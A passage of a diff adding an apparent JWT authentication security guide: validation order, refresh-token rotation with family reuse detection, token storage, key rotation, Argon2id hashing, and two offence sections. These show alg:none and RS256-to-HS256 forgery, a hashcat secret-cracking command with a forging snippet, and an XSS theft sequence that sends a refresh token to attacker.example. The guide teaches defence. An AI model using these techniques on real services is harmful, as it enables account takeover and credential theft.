+      the hidden cost of statelessness, and it is why HTTP/2 header compression matters so much for
+      token-authenticated APIs.</figcaption>
+  </figure>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">The refresh token is deliberately not a JWT</span>
+    <p>It is 32 bytes from a CSPRNG, base64url-encoded. It carries no claims because it needs none:
+      its meaning is a database row. That row is looked up by <code>SHA-256(token)</code>, so a full database
+      dump yields hashes rather than usable credentials, exactly as with passwords.</p>
+    <p>Making the refresh token a JWT is a common and self-defeating choice. You would gain
+      statelessness on a path that <em>must</em> be stateful in order to support rotation and revocation.</p>
+  </div>
+</section>
+
+<!-- ============================================ 03 -->
+<section class="part" id="s03">
+  <div class="part-head">
+    <span class="part-num">03 — Verification</span>
+    <h2>The validation pipeline</h2>
+  </div>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 350" role="img" aria-label="Eight validation steps in order. Split the token, check the algorithm against a hardcoded allowlist before anything else, select the public key by key id with one forced refresh on a miss, verify the signature, validate expiry, not-before, issuer and audience, optionally check the revocation list, optionally check that the user is still active, and finally attach the claims to the request context.">
+      <defs>
+        <marker id="v2-ar" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+          <path d="M0,0 L6.4,3 L0,6 z" class="f-ink2"/>
+        </marker>
+      </defs>
+      <text class="t-cap" x="0" y="12">order matters — step 2 must precede step 3</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+
+      <rect class="box" x="0" y="30" width="700" height="30" rx="3"/>
+      <text class="t-lab" x="12" y="50" style="font-weight:600">1 · split</text>
+      <text class="t-lab" x="110" y="50" style="font-size:9px">exactly two dots · reject anything over ~8 KB before parsing</text>
+      <line class="st" x1="350" y1="62" x2="350" y2="70" marker-end="url(#v2-ar)"/>
+
+      <rect class="pan-dan" x="0" y="74" width="700" height="44" rx="3" style="stroke-width:2"/>
+      <text class="t-lab" x="12" y="94" style="font-weight:600;fill:var(--danger)">2 · ALGORITHM CHECK — before anything else</text>
+      <text class="t-lab" x="340" y="94" style="fill:var(--danger)">if header.alg ∉ ["RS256"] → reject</text>
+      <text class="t-lab" x="12" y="110" style="font-size:9px">the header is attacker-controlled input. It may tell you which key to fetch. It may NEVER tell you how to verify.</text>
+      <line class="st" x1="350" y1="120" x2="350" y2="128" marker-end="url(#v2-ar)"/>
+
+      <rect class="box" x="0" y="132" width="700" height="44" rx="3"/>
+      <text class="t-lab" x="12" y="152" style="font-weight:600">3 · key selection by kid</text>
+      <text class="t-lab" x="220" y="152" style="font-size:9px">cache hit → use it. Miss → refresh JWKS <b>once</b>, retry <b>once</b>, then fail.</text>
+      <text class="t-lab" x="220" y="168" style="font-size:9px">a signature failure is never a reason to refresh — that path is a free denial-of-service against your own JWKS</text>
+      <line class="st" x1="350" y1="178" x2="350" y2="186" marker-end="url(#v2-ar)"/>
+
+      <rect class="pan-acc" x="0" y="190" width="700" height="30" rx="3"/>
+      <text class="t-lab" x="12" y="210" style="font-weight:600;fill:var(--accent)">4 · signature</text>
+      <text class="t-lab" x="150" y="210" style="font-size:9px">RSA_verify(SHA256(header_b64 + "." + payload_b64), sig, pub_key)</text>
+      <line class="st" x1="350" y1="222" x2="350" y2="230" marker-end="url(#v2-ar)"/>
+
+      <rect class="pan-acc" x="0" y="234" width="700" height="46" rx="3"/>
+      <text class="t-lab" x="12" y="254" style="font-weight:600;fill:var(--accent)">5 · claims</text>
+      <text class="t-lab" x="150" y="254">exp &gt; now − skew · nbf ≤ now + skew · <b>iss exact</b> · <b>this service ∈ aud</b></text>
+      <text class="t-lab" x="150" y="272" style="font-size:9px">clock skew tolerance ≤ 60 s. Five minutes is a five-minute extension of every stolen token's life.</text>
+      <line class="st" x1="350" y1="282" x2="350" y2="290" marker-end="url(#v2-ar)"/>
+
+      <rect class="pan-wrn" x="0" y="294" width="344" height="52" rx="3"/>
+      <text class="t-lab" x="12" y="314" style="font-weight:600;fill:var(--warn)">6 · revocation — optional</text>
+      <text class="t-lab" x="12" y="330" style="font-size:9px">redis.exists("blacklist:jti:" + jti)</text>
+      <text class="t-lab" x="12" y="342" style="font-size:9px">this re-adds a network call to every request</text>
+
+      <rect class="pan-saf" x="356" y="294" width="344" height="52" rx="3"/>
+      <text class="t-lab" x="368" y="314" style="font-weight:600;fill:var(--safe)">7 · attach and proceed</text>
+      <text class="t-lab" x="368" y="330" style="font-size:9px">request.user_id = sub · roles · scope · jti</text>
+      <text class="t-lab" x="368" y="342" style="font-size:9px">downstream code may now trust these</text>
+    </svg>
+    </div>
+    <figcaption>Step 6 is where the architecture argues with itself. Adding it gives you real logout
+      and costs you the "zero database calls" property that justified JWTs in the first place. <b>Many
+      systems correctly choose to skip it</b> and accept that a revoked token stays valid for at most
+      fifteen minutes. That is a decision to make deliberately, not by omission.</figcaption>
+  </figure>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">The user-disabled window</span>
+    <p>Disabling an account in the database does not invalidate issued tokens. Three options, in
+      increasing cost: accept the window and keep <code>exp</code> short; cache the active flag in Redis and
+      check it during validation, which is the same cost as a blacklist check; or use opaque
+      reference tokens and give up statelessness entirely. Pick based on how quickly a
+      "revoke this employee now" request has to take effect.</p>
+  </div>
+</section>
+
+<!-- ============================================ 04 -->
+<section class="part" id="s04">
+  <div class="part-head">
+    <span class="part-num">04 — Rotation</span>
+    <h2>Rotation and families</h2>
+  </div>
+  <p class="lede">Rotation alone limits exposure. Family tracking turns rotation into a <em>detector</em>,
+    which is a much stronger property.</p>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 340" role="img" aria-label="Refresh token family reuse detection. A chain of tokens shares one family id, each rotation revoking its predecessor. When an attacker steals a token and uses it, the legitimate client later presents the same now-revoked token. The server sees a revoked token from a known family, concludes the family is compromised, and revokes every token in it, forcing both parties to re-authenticate.">
+      <defs>
+        <marker id="f2-ar" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+          <path d="M0,0 L6.4,3 L0,6 z" class="f-ink2"/>
+        </marker>
+        <marker id="f2-ard" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+          <path d="M0,0 L6.4,3 L0,6 z" class="f-dan"/>
+        </marker>
+      </defs>
+      <text class="t-cap" x="0" y="12">family_id = f7a2 — one chain, one identity, one alarm</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+
+      <!-- legit chain -->
+      <text class="t-lab" x="0" y="48" style="font-size:9px">legitimate client</text>
+      <rect class="box-sunk" x="100" y="34" width="96" height="30" rx="2"/>
+      <text class="t-lab" x="148" y="53" text-anchor="middle" style="font-size:9px">RT-1 · revoked</text>
+      <line class="st" x1="200" y1="49" x2="222" y2="49" marker-end="url(#f2-ar)"/>
+      <rect class="box-sunk" x="226" y="34" width="96" height="30" rx="2"/>
+      <text class="t-lab" x="274" y="53" text-anchor="middle" style="font-size:9px">RT-2 · revoked</text>
+      <line class="st" x1="326" y1="49" x2="348" y2="49" marker-end="url(#f2-ar)"/>
+      <rect class="pan-saf" x="352" y="34" width="96" height="30" rx="2"/>
+      <text class="t-lab" x="400" y="53" text-anchor="middle" style="font-size:9px;fill:var(--safe)">RT-3 · active</text>
+
+      <!-- theft -->
+      <path class="st-dash c-dan" d="M274,68 L274,96" marker-end="url(#f2-ard)"/>
+      <rect class="pan-dan" x="180" y="100" width="188" height="34" rx="3"/>
+      <text class="t-lab" x="190" y="120" style="fill:var(--danger);font-size:9px">attacker steals RT-2 via XSS or a log</text>
+
+      <path class="st c-dan" d="M368,117 L444,117" marker-end="url(#f2-ard)"/>
+      <rect class="pan-dan" x="448" y="100" width="200" height="34" rx="3"/>
+      <text class="t-lab" x="458" y="120" style="fill:var(--danger);font-size:9px">attacker refreshes → gets RT-3′ (their own)</text>
+
+      <!-- the collision -->
+      <line class="rule" x1="0" y1="156" x2="700" y2="156"/>
+      <text class="t-cap" x="0" y="174" style="fill:var(--danger)">the moment of detection</text>
+
+      <rect class="box" x="0" y="184" width="330" height="66" rx="3"/>
+      <text class="t-lab" x="12" y="204" style="font-weight:600">the real user comes back</text>
+      <text class="t-lab" x="12" y="222" style="font-size:9px">presents RT-2 — the token they still hold</text>
+      <text class="t-lab" x="12" y="238" style="font-size:9px">but RT-2 was marked revoked when the attacker used it</text>
+
+      <path class="st c-dan" d="M334,217 L364,217" marker-end="url(#f2-ard)"/>
+
+      <rect class="pan-dan" x="368" y="184" width="332" height="66" rx="3" style="stroke-width:2"/>
+      <text class="t-lab" x="380" y="204" style="fill:var(--danger);font-weight:600">A REVOKED TOKEN FROM A LIVE FAMILY WAS PRESENTED</text>
+      <text class="t-lab" x="380" y="222" style="font-size:9px">There is no benign explanation. Either the client replayed, or</text>
+      <text class="t-lab" x="380" y="238" style="font-size:9px">two parties hold tokens from one chain. Both mean: compromised.</text>
+
+      <rect class="pan-saf" x="0" y="264" width="700" height="66" rx="3"/>
+      <text class="t-lab" x="12" y="284" style="fill:var(--safe);font-weight:600">RESPONSE — revoke the entire family</text>
+      <text class="t-lab" x="12" y="302">UPDATE refresh_tokens SET revoked_at = NOW() WHERE family_id = 'f7a2';</text>
+      <text class="t-lab" x="12" y="320" style="font-size:9px">The attacker loses access. So does the user, who must re-authenticate — an acceptable cost, and the signal that tells them something happened.</text>
+    </svg>
+    </div>
+    <figcaption>The detection is not probabilistic. In a correctly rotating chain, <b>presenting a
+      revoked token is impossible for a well-behaved client</b>, so a single occurrence is proof of a
+      duplicate holder. This is one of the few authentication controls that produces a
+      high-confidence signal with no tuning.</figcaption>
+  </figure>
+
+<pre><code>CREATE TABLE refresh_tokens (
+  token_hash   CHAR(64) NOT NULL UNIQUE,   <i># SHA-256 hex — never the plaintext</i>
+  user_id      UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
+  <b>family_id    UUID NOT NULL</b>,             <i># set once, carried through every rotation</i>
+  issued_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  expires_at   TIMESTAMPTZ NOT NULL,       <i># NOW() + 30 days</i>
+  last_used_at TIMESTAMPTZ,
+  revoked_at   TIMESTAMPTZ,                <i># NULL means active</i>
+  ip_hash      CHAR(64), ua_hash CHAR(64)  <i># for anomaly detection, not for enforcement</i>
+);
+CREATE INDEX idx_rt_family ON refresh_tokens(family_id);
+CREATE INDEX idx_rt_expires ON refresh_tokens(expires_at);   <i># the cleanup job needs this</i></code></pre>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">Rotation's own failure mode</span>
+    <p>A mobile client that crashes between receiving a new token and persisting it holds a token the
+      server has already revoked. Its next refresh looks exactly like theft, and the user is logged
+      out for no reason.</p>
+    <p><strong>The fix is a grace period:</strong> accept a token revoked within the last few seconds if the
+      replacement has not yet been used, and only treat it as compromise if the successor <em>has</em> been
+      used. This keeps the detector while removing the false positive.</p>
+  </div>
+</section>
+
+<!-- ============================================ 05 -->
+<section class="part" id="s05">
+  <div class="part-head">
+    <span class="part-num">05 — Client</span>
+    <h2>Where tokens live</h2>
+  </div>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 300" role="img" aria-label="Token storage options plotted against two threats. localStorage and sessionStorage are readable by any script so cross-site scripting steals them, but they are immune to cross-site request forgery. HttpOnly cookies are invisible to scripts but are sent automatically so they need SameSite protection. An in-memory variable is safe from both but is lost on page reload. The recommended split puts the short-lived access token in memory and the refresh token in a strict HttpOnly cookie.">
+      <text class="t-cap" x="0" y="12">two threats, and no single location beats both</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+
+      <text class="t-lab" x="200" y="40" text-anchor="middle" style="font-size:9px">XSS can read it</text>
+      <text class="t-lab" x="380" y="40" text-anchor="middle" style="font-size:9px">CSRF applies</text>
+      <text class="t-lab" x="560" y="40" text-anchor="middle" style="font-size:9px">notes</text>
+      <line class="rule" x1="0" y1="46" x2="700" y2="46"/>
+
+      <text class="t-lab" x="0" y="70">localStorage</text>
+      <rect class="pan-dan" x="160" y="56" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="70" text-anchor="middle" style="font-size:9px;fill:var(--danger)">YES</text>
+      <rect class="pan-saf" x="340" y="56" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="70" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <text class="t-lab" x="440" y="70" style="font-size:9px">the common mistake; survives tabs and restarts</text>
+
+      <text class="t-lab" x="0" y="102">sessionStorage</text>
+      <rect class="pan-dan" x="160" y="88" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="102" text-anchor="middle" style="font-size:9px;fill:var(--danger)">YES</text>
+      <rect class="pan-saf" x="340" y="88" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="102" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <text class="t-lab" x="440" y="102" style="font-size:9px">identical XSS exposure, shorter life</text>
+
+      <text class="t-lab" x="0" y="134">service worker cache</text>
+      <rect class="pan-dan" x="160" y="120" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="134" text-anchor="middle" style="font-size:9px;fill:var(--danger)">YES</text>
+      <rect class="pan-saf" x="340" y="120" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="134" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <text class="t-lab" x="440" y="134" style="font-size:9px">feels safer than it is — still script-reachable</text>
+
+      <text class="t-lab" x="0" y="166">HttpOnly cookie</text>
+      <rect class="pan-saf" x="160" y="152" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="166" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <rect class="pan-wrn" x="340" y="152" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="166" text-anchor="middle" style="font-size:9px;fill:var(--warn)">yes</text>
+      <text class="t-lab" x="440" y="166" style="font-size:9px">sent automatically — needs SameSite</text>
+
+      <text class="t-lab" x="0" y="198">HttpOnly + SameSite=Strict</text>
+      <rect class="pan-saf" x="160" y="184" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="198" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <rect class="pan-saf" x="340" y="184" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="198" text-anchor="middle" style="font-size:9px;fill:var(--safe)">mitigated</text>
+      <text class="t-lab" x="440" y="198" style="font-size:9px;fill:var(--safe)">best default — and Strict works here, unlike OAuth</text>
+
+      <text class="t-lab" x="0" y="230">in-memory variable</text>
+      <rect class="pan-saf" x="160" y="216" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="200" y="230" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no*</text>
+      <rect class="pan-saf" x="340" y="216" width="80" height="20" rx="2"/>
+      <text class="t-lab" x="380" y="230" text-anchor="middle" style="font-size:9px;fill:var(--safe)">no</text>
+      <text class="t-lab" x="440" y="230" style="font-size:9px">* XSS in the same context still reaches it; lost on reload</text>
+
+      <line class="rule" x1="0" y1="252" x2="700" y2="252"/>
+      <rect class="pan-saf" x="0" y="262" width="700" height="38" rx="3"/>
+      <text class="t-lab" x="12" y="280" style="fill:var(--safe);font-weight:600">THE PATTERN: access token in memory (15 min) · refresh token in HttpOnly Strict cookie (30 days)</text>
+      <text class="t-lab" x="12" y="294" style="font-size:9px">XSS cannot reach the refresh token at all. XSS can exfiltrate the access token, and it dies in fifteen minutes. Neither is CSRF-usable.</text>
+    </svg>
+    </div>
+    <figcaption>Read the bottom row as the whole point: the two tokens have different threat profiles,
+      so <b>put them in different places</b>. Storing both in <code>localStorage</code> because it is convenient
+      collapses the design into a single credential that any script on your origin can steal and use
+      for thirty days.</figcaption>
+  </figure>
+</section>
+
+<!-- ============================================ 06 -->
+<section class="part" id="s06">
+  <div class="part-head">
+    <span class="part-num">06 — Keys</span>
+    <h2>Keys and rotation</h2>
+  </div>
+
+  <div class="panel panel--threat">
+    <span class="panel-label">The RSA private key is the whole system</span>
+    <p>Compromise means forging any token, for any user, with any roles, indefinitely, with no
+      detectable trace. Protect it accordingly:</p>
+    <ul>
+      <li><strong>Never on disk in plaintext.</strong> Fetched at startup from KMS or Vault via an IAM-authenticated
+        call, cached in memory only.</li>
+      <li><strong>HSM-backed KMS is the strong version.</strong> The key is generated inside the HSM and never
+        leaves it; the service asks the HSM to sign. A fully compromised process can then request
+        signatures but cannot exfiltrate the key.</li>
+      <li><strong>Only the auth service holds <code>kms:Sign</code>.</strong> Resource APIs need the public key and nothing
+        else, which is the reason to use RS256 rather than HS256 in the first place.</li>
+      <li><strong>Every signing operation is audited</strong> in CloudTrail or the Vault audit log.</li>
+    </ul>
+  </div>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 250" role="img" aria-label="Zero-downtime RSA key rotation in five steps. Generate a new key pair, publish both public keys at the JWKS endpoint, switch signing to the new key, wait for all tokens signed with the old key to expire, and only then remove the old public key. Removing it early causes mass 401 errors until every outstanding token expires.">
+      <defs>
+        <marker id="k-ar" markerWidth="7" markerHeight="7" refX="6.4" refY="3" orient="auto">
+          <path d="M0,0 L6.4,3 L0,6 z" class="f-ink2"/>
+        </marker>
+      </defs>
+      <text class="t-cap" x="0" y="12">rotation with no restart and no failed request</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+
+      <rect class="box" x="0" y="32" width="130" height="60" rx="3"/>
+      <text class="t-lab" x="10" y="50" style="font-weight:600">1 · generate</text>
+      <text class="t-lab" x="10" y="66" style="font-size:9px">key-2025-01</text>
+      <text class="t-lab" x="10" y="80" style="font-size:9px">not yet used</text>
+      <line class="st" x1="134" y1="62" x2="152" y2="62" marker-end="url(#k-ar)"/>
+
+      <rect class="pan-acc" x="156" y="32" width="150" height="60" rx="3"/>
+      <text class="t-lab" x="166" y="50" style="font-weight:600;fill:var(--accent)">2 · publish BOTH</text>
+      <text class="t-lab" x="166" y="66" style="font-size:9px">JWKS serves</text>
+      <text class="t-lab" x="166" y="80" style="font-size:9px">[2024-01, 2025-01]</text>
+      <line class="st" x1="310" y1="62" x2="328" y2="62" marker-end="url(#k-ar)"/>
+
+      <rect class="box" x="332" y="32" width="150" height="60" rx="3"/>
+      <text class="t-lab" x="342" y="50" style="font-weight:600">3 · switch signing</text>
+      <text class="t-lab" x="342" y="66" style="font-size:9px">new tokens carry</text>
+      <text class="t-lab" x="342" y="80" style="font-size:9px">kid = key-2025-01</text>
+      <line class="st" x1="486" y1="62" x2="504" y2="62" marker-end="url(#k-ar)"/>
+
+      <rect class="pan-wrn" x="508" y="32" width="192" height="60" rx="3"/>
+      <text class="t-lab" x="518" y="50" style="font-weight:600;fill:var(--warn)">4 · WAIT</text>
+      <text class="t-lab" x="518" y="66" style="font-size:9px">until every key-2024-01 token</text>
+      <text class="t-lab" x="518" y="80" style="font-size:9px">has expired — 15 minutes</text>
+
+      <line class="st" x1="604" y1="96" x2="604" y2="112" marker-end="url(#k-ar)"/>
+      <rect class="pan-saf" x="508" y="116" width="192" height="46" rx="3"/>
+      <text class="t-lab" x="518" y="136" style="font-weight:600;fill:var(--safe)">5 · retire the old key</text>
+      <text class="t-lab" x="518" y="152" style="font-size:9px">JWKS serves [2025-01] only</text>
+
+      <line class="rule" x1="0" y1="184" x2="700" y2="184"/>
+      <rect class="pan-dan" x="0" y="196" width="700" height="50" rx="3"/>
+      <text class="t-lab" x="12" y="216" style="fill:var(--danger);font-weight:600">SKIP STEP 4 AND EVERY OUTSTANDING TOKEN FAILS</text>
+      <text class="t-lab" x="12" y="234" style="font-size:9px">Removing the old public key while tokens signed by it are still valid produces mass 401s until they expire or users re-login. During step 4 both keys verify, and kid tells each validator which to use.</text>
+    </svg>
+    </div>
+    <figcaption>The <code>kid</code> header is what makes this work. Without it a validator has to try every
+      known key until one succeeds, which is both slow and ambiguous. <b>With it, rotation is a
+      configuration change rather than an outage.</b></figcaption>
+  </figure>
+
+  <div class="panel panel--pitfall">
+    <span class="panel-label">Never evict the JWKS cache without a replacement in hand</span>
+    <p>A resource API whose cache expires while the JWKS endpoint is unavailable cannot validate any
+      token, and every authenticated request returns 401. That is a total outage caused by a cache
+      TTL. Cache for 6 to 24 hours, refresh proactively, jitter the expiry across instances, and
+      consider serving the JWKS from a static CDN-backed location as a fallback.</p>
+  </div>
+</section>
+
+<!-- ============================================ 07 -->
+<section class="part" id="s07">
+  <div class="part-head">
+    <span class="part-num">07 — Credentials</span>
+    <h2>Password hashing</h2>
+  </div>
+
+<pre><code>algorithm:    <b>Argon2id</b>       <i># RFC 9106 — combines Argon2i and Argon2d properties</i>
+m (memory):   65536 KiB (64 MB) <i># the parameter that defeats GPUs</i>
+t (time):     3
+p (parallel): 4
+salt:         16 bytes CSPRNG, unique per password
+output:       32 bytes
+
+stored as a PHC string:
+$argon2id$v=19$m=65536,t=3,p=4$&lt;b64 salt&gt;$&lt;b64 hash&gt;</code></pre>
+
+  <div class="tbl">
+    <table>
+      <thead><tr><th>KDF</th><th>Memory cost</th><th>The problem</th></tr></thead>
+      <tbody>
+        <tr><td>bcrypt</td><td>Fixed 4 KB</td><td><b>Silently truncates at 72 bytes</b>, so a long password and its prefix hash identically. Fixed low memory means modern GPUs run millions per second.</td></tr>
+        <tr><td>scrypt</td><td>Configurable</td><td>Memory-hard and fine, but less flexible tuning and thinner tooling.</td></tr>
+        <tr><td><b>Argon2id</b></td><td>Configurable, 64 MB typical</td><td><span class="tag tag--ok">use this</span> No truncation, memory cost makes GPU parallelism impractical, winner of the Password Hashing Competition.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="panel panel--threat">
+    <span class="panel-label">The KDF is also a denial-of-service primitive</span>
+<pre><code>100 concurrent POSTs to /auth/login, each with a 1 MB password
+  → 100 × Argon2id over 1 MB of input at 64 MB of memory each
+  → 6.4 GB of RAM and every core saturated
+  → the auth service stops answering anything, including health checks
+
+<s>if len(password) &gt; 1024: reject BEFORE hashing</s>
+<i># bcrypt happens to be immune because it truncates at 72 bytes.</i>
+<i># Argon2 is not. Bound the input yourself.</i></code></pre>
+    <p>Two more controls belong here. Run the KDF in a <strong>fixed-size dedicated thread pool</strong> so a login
+      spike cannot starve refreshes, logouts and health checks. And apply the rate limit
+      <strong>before</strong> hashing, not after, or the limiter is protecting nothing.</p>
+  </div>
+
+  <div class="panel panel--defense">
+    <span class="panel-label">What NIST SP 800-63B actually recommends</span>
+    <p>Enforce a minimum length and a hard maximum. Do <strong>not</strong> enforce composition rules — no required
+      symbols, no forced rotation. Instead, <strong>check the submitted password against known-breached
+      lists</strong>, which is the control that correlates with real-world compromise. Complexity rules push
+      users toward predictable substitutions and add no measurable security.</p>
+  </div>
+</section>
+
+<!-- ============================================ 08 -->
+<section class="part" id="s08">
+  <div class="part-head">
+    <span class="part-num">08 — Design</span>
+    <h2>Sessions versus tokens</h2>
+  </div>
+
+  <div class="tbl">
+    <table>
+      <thead><tr><th>Property</th><th>Server-side session</th><th>JWT</th></tr></thead>
+      <tbody>
+        <tr><td><b>Revocation</b></td><td><span class="tag tag--ok">immediate</span> delete the record</td><td><span class="tag tag--bad">delayed</span> until <code>exp</code>, or a blacklist</td></tr>
+        <tr><td><b>DB calls per request</b></td><td>1 — the session lookup</td><td><span class="tag tag--ok">0</span> — or 1 if you blacklist</td></tr>
+        <tr><td><b>Shared state</b></td><td>Required (Redis)</td><td><span class="tag tag--ok">none</span> for validation</td></tr>
+        <tr><td><b>Bytes per request</b></td><td>~32 (a session id)</td><td>600–900</td></tr>
+        <tr><td><b>Claim freshness</b></td><td><span class="tag tag--ok">read from DB each time</span></td><td>Stale until re-issued</td></tr>
+        <tr><td><b>Logout</b></td><td><span class="tag tag--ok">reliable</span></td><td>Unreliable without a blacklist</td></tr>
+        <tr><td><b>Horizontal scaling</b></td><td>Session store is a dependency</td><td><span class="tag tag--ok">fully stateless</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p><strong>The decision rule.</strong> JWTs win when token lifetime is short and the application can tolerate a
+    revocation delay measured in minutes. Sessions win when instantaneous logout is a hard
+    requirement — financial, medical, government. <strong>If you find yourself adding a blacklist check to
+    every request, you have rebuilt sessions with larger cookies</strong>, and you should reconsider whether
+    the JWT was buying you anything.</p>
+</section>
+
+<!-- ============================================ 09 -->
+<section class="part" id="s09">
+  <div class="part-head">
+    <span class="part-num">09 — Offence</span>
+    <h2>Forging tokens</h2>
+  </div>
+
+  <figure>
+    <div class="fig-scroll">
+    <svg viewBox="0 0 700 280" role="img" aria-label="Two forgery techniques. Setting the algorithm to none makes a permissive library skip signature verification entirely. Setting it to HS256 lets the attacker compute an HMAC using the RSA public key bytes as the shared secret, which a library that picks its verifier from the header will accept. Both are stopped by passing an explicit algorithm allowlist.">
+      <text class="t-cap" x="0" y="12">the header is attacker-controlled, and libraries used to be helpful</text>
+      <line class="rule" x1="0" y1="20" x2="700" y2="20"/>
+      <line class="rule" x1="340" y1="26" x2="340" y2="200"/>
+
+      <text class="t-cap" x="0" y="44" style="fill:var(--danger)">A · alg: none</text>
+      <rect class="pan-dan" x="0" y="54" width="322" height="120" rx="3"/>
+      <text class="t-lab" x="10" y="74" style="font-size:9px">header  {"alg":"<b>none</b>","typ":"JWT"}</text>
+      <text class="t-lab" x="10" y="92" style="font-size:9px">payload {"sub":"admin-uuid","roles":["<b>admin</b>"],</text>
+      <text class="t-lab" x="10" y="106" style="font-size:9px">         "exp":9999999999}</text>
+      <text class="t-lab" x="10" y="126" style="font-size:9px">token   header.payload<b>.</b>   ← empty signature</text>
+      <text class="t-lab" x="10" y="150" style="font-size:9px;fill:var(--danger)">a library that honours "none" skips verification</text>
+      <text class="t-lab" x="10" y="164" style="font-size:9px;fill:var(--danger)">and trusts the payload outright</text>
+
+      <text class="t-cap" x="368" y="44" style="fill:var(--danger)">B · RS256 → HS256</text>
+      <rect class="pan-dan" x="368" y="54" width="332" height="120" rx="3"/>
+      <text class="t-lab" x="378" y="74" style="font-size:9px">1 · fetch the RSA public key from /.well-known/jwks.json</text>
+      <text class="t-lab" x="378" y="90" style="font-size:9px">    (it is public — that is the point of it)</text>
+      <text class="t-lab" x="378" y="110" style="font-size:9px">2 · set header {"alg":"<b>HS256</b>"}</text>
+      <text class="t-lab" x="378" y="128" style="font-size:9px">3 · HMAC-SHA256 the token using <b>the public key bytes</b></text>
+      <text class="t-lab" x="378" y="142" style="font-size:9px">    as the shared secret</text>
+      <text class="t-lab" x="378" y="162" style="font-size:9px;fill:var(--danger)">4 · a library that picks its verifier from the header</text>
+      <text class="t-lab" x="378" y="176" style="font-size:9px;fill:var(--danger)">    verifies it successfully</text>
+
+      <line class="rule" x1="0" y1="206" x2="700" y2="206"/>
+      <rect class="pan-saf" x="0" y="216" width="700" height="60" rx="3"/>
+      <text class="t-lab" x="12" y="236" style="fill:var(--safe);font-weight:600">jwt.decode(token, public_key, <b>algorithms=["RS256"]</b>)</text>
+      <text class="t-lab" x="12" y="254" style="font-size:9px">Not a check that the header says RS256 — an allowlist passed to the verifier, so the header cannot influence the decision at all.</text>
+      <text class="t-lab" x="12" y="270" style="font-size:9px">Detection: log the alg of every inbound token. Anything but RS256 has a baseline rate of zero, which makes it a perfect alert.</text>
+    </svg>
+    </div>
+    <figcaption>Neither attack generates traffic anywhere except your own service, so detection has to
+      be local. The forged tokens also tend to carry giveaways — a <code>sub</code> that matches no user, roles
+      that appear with no corresponding database change, an <code>iat</code> far in the past for a user who just
+      logged in. <b>Those are all cheap secondary checks.</b></figcaption>
+  </figure>
+
+  <div class="panel panel--threat">
+    <span class="panel-label">HS256 with a weak secret is offline-crackable</span>
+<pre><code><i># attacker registers a free account and captures one valid token</i>
+hashcat -a 0 -m 16500 captured.jwt rockyou.txt
+<i># mode 16500 = HMAC-SHA256 JWT. Billions of candidates per second on a GPU.</i>
+<i># "secret", "jwt_secret", the app's hostname — found in seconds.</i>
+
+<i># then:</i>
+forged = jwt.encode({"sub":"admin-uuid","roles":["admin"],"exp":far_future},
+                    cracked_secret, algorithm="HS256")</code></pre>
+    <p>The whole attack is offline after a single token is captured, so nothing is detectable until
+      the forged token is used. And because one secret signs every token, cracking it forges tokens
+      for <strong>every user including admins</strong>, with no <code>kid</code>-based containment available.</p>
+    <p><strong>Use RS256.</strong> If HS256 is unavoidable for legacy reasons, the secret must be 256 bits from a
+      CSPRNG, never a human-chosen string, and it must be rotated.</p>
+  </div>
+</section>
+
+<!-- ============================================ 10 -->
+<section class="part" id="s10">
+  <div class="part-head">
+    <span class="part-num">10 — Offence</span>
+    <h2>Stealing and misusing them</h2>
+  </div>
+
+  <h3>Audience bypass — one valid token, two services</h3>
+<pre><code>Service A (low privilege) issues:   {"aud": ["https://service-a.example.com"], "roles":["user"]}
+Attacker presents that same token to Service B (high privilege).
+
+Service B checks: signature ✓ (same signing key)   exp ✓
+<u>Service B does NOT check aud.</u>
+→ accepted. The attacker now operates in a service they were never authorised for.</code></pre>
+  <p>The signature is valid for <em>any</em> audience because the signature covers the payload including
+    <code>aud</code>. Only the recipient can enforce the restriction, and a recipient that skips the check is
+    accepting tokens minted for someone else. In a multi-service estate sharing one auth service,
+    <strong>this is the most commonly missing validation.</strong></p>
+
+  <h3>Refresh token theft via XSS</h3>
+<pre><code>1. malicious script (XSS or a compromised npm package) runs in the victim's origin
+2. <u>localStorage.getItem('refresh_token')</u>          ← only possible because it is there
+3. fetch('https://attacker.example/collect?t=' + rt)
+4. attacker refreshes from their own server, gets a fresh pair, and continues the chain
+5. the victim's next refresh fails — <b>they think they were just logged out</b>
+
+<i># with family tracking this becomes the detection in section 4.</i>
+<i># without it, the attacker holds access for the full 30-day refresh lifetime.</i></code></pre>
+
+  <div class="panel panel--pitfall">
